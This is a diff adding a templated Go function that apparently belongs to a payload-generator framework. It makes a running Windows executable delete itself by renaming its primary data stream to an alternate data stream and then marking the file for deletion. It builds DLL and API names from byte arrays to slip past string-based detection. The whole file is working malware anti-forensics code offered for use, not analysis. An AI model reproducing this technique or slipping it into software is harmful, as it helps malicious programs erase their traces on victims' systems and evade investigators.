@@ -1,0 +1,123 @@
+func selfDelete() error {
+
+	{{if .Debug}}
+	printDebug("info","Loading kernel32.dll ...")
+	{{end}}
+
+	kernel32 := windows.NewLazySystemDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}))
+
+	{{if .Debug}}
+	printDebug("info","Loading GetModuleFileNameW, CreateFileW, SetFileInformationByHandle procedures...")
+	{{end}}
+
+    GetModuleFileNameW := kernel32.NewProc(string([]byte{'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','W'}))
+
+    b := make([]uint16, 32767)
+    r, _, errGetModuleFileNameW := GetModuleFileNameW.Call(0, uintptr(unsafe.Pointer(&b[0])), uintptr(len(b)))
+
+    if errGetModuleFileNameW != nil && errGetModuleFileNameW != syscall.Errno(0){
+		return errGetModuleFileNameW
+	}
+
+    n := uint32(r)
+    if n == 0 {
+        return fmt.Errorf("Self Delete error: Current executable path is empty")
+    }
+
+    exPath := string(utf16.Decode(b[:n]))
+
+    {{if .Debug}}
+	printDebug("info","Current executable path: %s", exPath)
+	{{end}}
+
+    fName, err := syscall.UTF16PtrFromString(exPath)
+
+    if err != nil {
+		return err
+	}
+
+    fileHandle, errCreateFileW := windows.CreateFile(
+		    fName,
+		    windows.DELETE,
+		    0,
+			nil,  
+		    windows.OPEN_EXISTING,
+		    windows.FILE_ATTRIBUTE_NORMAL,
+		    0,
+	)
+
+    if errCreateFileW != nil && errCreateFileW != syscall.Errno(0){
+		return fmt.Errorf("CreateFile error: %s", errCreateFileW)
+	}
+    
+    newADS := ":{{ .NewADS }}"
+
+    a, err := windows.UTF16FromString(newADS)
+
+    if err != nil {
+		return err
+	}
+
+	fileRenameInfo := &struct {
+		replaceIfExists byte
+		rootDirectory   uintptr
+		fileNameLength  uint32
+		fileName        [windows.MAX_PATH]uint16
+	}{
+		replaceIfExists: 0,
+		rootDirectory: uintptr(unsafe.Pointer(nil)),
+		fileNameLength: uint32(len(a)),
+	}
+
+    copy(fileRenameInfo.fileName[:], a[:])
+
+    errSetFileInformationByHandle := windows.SetFileInformationByHandle(fileHandle, windows.FileRenameInfo, (*byte)(unsafe.Pointer(fileRenameInfo)), uint32(unsafe.Sizeof(*fileRenameInfo)))
+
+    if errSetFileInformationByHandle != nil {
+		return fmt.Errorf("SetFileInformationByHandle error: %s && %s", errSetFileInformationByHandle, windows.GetLastError())
+	}
+
+	{{if .Debug}}
+	printDebug("info","Successfully renamed file primary :$DATA ADS to %s, closing initial handle", newADS)
+	{{end}}
+
+	windows.CloseHandle(fileHandle)
+
+    fileHandle2, errCreateFileW2 := windows.CreateFile(
+		fName,
+		windows.DELETE,
+		0,
+		nil,  
+		windows.OPEN_EXISTING,
+		windows.FILE_ATTRIBUTE_NORMAL,
+		0,
+	)
+    
+    if errCreateFileW2 != nil && errCreateFileW2 != syscall.Errno(0){
+		return fmt.Errorf("CreateFile2 error: %s", errCreateFileW2)
+	}
+
+	{{if .Debug}}
+	printDebug("info","Got a second handle to perform dispose file part")
+	{{end}}
+
+    deleteFile := byte(1)
+
+    errSetFileInformationByHandle = windows.SetFileInformationByHandle(fileHandle2, windows.FileDispositionInfo, &deleteFile, 1)
+
+    if errSetFileInformationByHandle != nil && errSetFileInformationByHandle != syscall.Errno(0){
+		return fmt.Errorf("SetFileInformationByHandle2 error: %s && %s", errSetFileInformationByHandle, windows.GetLastError())
+	}
+
+	{{if .Debug}}
+	printDebug("info","Deletion attribute set successfully! Destroying handle to trigger self-deletion.")
+	{{end}}
+
+	windows.CloseHandle(fileHandle2)
+
+	{{if .Debug}}
+	printDebug("info","We should have successfully deleted the file: %s", exPath)
+	{{end}}
+    
+    return nil
+}
